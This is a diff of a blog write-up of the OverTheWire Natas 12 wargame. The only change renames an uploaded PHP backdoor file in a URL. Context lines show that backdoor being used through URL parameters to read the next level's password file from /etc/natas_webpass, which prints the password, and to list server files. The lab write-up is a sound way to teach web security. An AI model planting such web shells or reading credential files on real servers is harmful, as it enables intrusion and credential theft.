@@ -112,7 +112,7 @@ Let's hack! Inject a classic shell backdoor:
 [http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=cat%20/etc/natas_webpass/natas13](http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=cat%20/etc/natas_webpass/natas13) gives `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.
 
 
-We can also display other people's solutions: [http://natas12.natas.labs.overthewire.org/upload/000_floriancourgey_com_backdoor.php?backdoor=ls -alh](http://natas12.natas.labs.overthewire.org/upload/000_floriancourgey_com_backdoor.php?backdoor=ls -alh)
+We can also display other people's solutions: [http://natas12.natas.labs.overthewire.org/upload/000_myrosblog_com_backdoor.php?backdoor=ls -alh](http://natas12.natas.labs.overthewire.org/upload/000_myrosblog_com_backdoor.php?backdoor=ls -alh)
 
 ![](/assets/images/2018/12/overthewire-natas12-php-injection-list-solutions.jpg)
 
